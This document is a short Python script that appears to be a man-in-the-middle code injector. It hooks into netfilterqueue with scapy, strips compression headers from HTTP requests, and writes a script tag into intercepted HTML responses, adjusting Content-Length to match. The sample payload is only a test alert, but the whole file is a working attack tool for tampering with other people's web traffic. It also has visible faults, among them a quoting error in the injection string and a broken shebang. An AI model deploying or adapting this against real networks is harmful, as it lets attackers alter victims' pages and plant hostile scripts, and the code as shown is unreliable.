#!usr/bin/env python

from scapy.layers.inet import IP, UDP, Ether as scapy
import scapy.all as scapy
import netfilterqueue
import re



def set_load(spacket, location):
    spacket[scapy.Raw].load = location
    del spacket[scapy.TCP].chksum
    del spacket[scapy.IP].len
    del spacket[scapy.IP].chksum
    return spacket


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Content-Encoding:.*?\\r\\n", "", load)
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = '<script>alert('test');</script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            print(scapy_packet.show())
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(str(content_length), str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


